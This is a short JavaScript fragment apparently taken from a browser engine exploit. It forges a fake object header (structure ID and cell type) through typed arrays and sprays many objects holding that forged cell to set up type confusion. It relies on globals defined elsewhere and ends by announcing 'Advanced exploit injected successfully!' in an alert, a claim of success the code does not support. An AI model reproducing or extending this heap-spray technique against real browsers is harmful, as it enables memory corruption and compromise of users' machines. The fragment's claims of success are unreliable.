function sprayArray() {
    let structureID = 0x800;
    let cellTypes = 0x01072107; // ArrayType
    i32[0] = structureID;
    i32[1] = cellTypes;
    let cell = f64[0];
    
    for(let i = 0; i < spray_count; i++) {
        for(let j = 0; j < spray_length; j++) {
            let o = {p1:1.1, p2:1.1, p3:cell, p4:unboxed, p5:2.2, p6:3.3};
            sprays[i][j] = o;
        }
    }
    
    let exploit = "Advanced exploit injected successfully!";
    console.log(exploit);
    alert(exploit);
}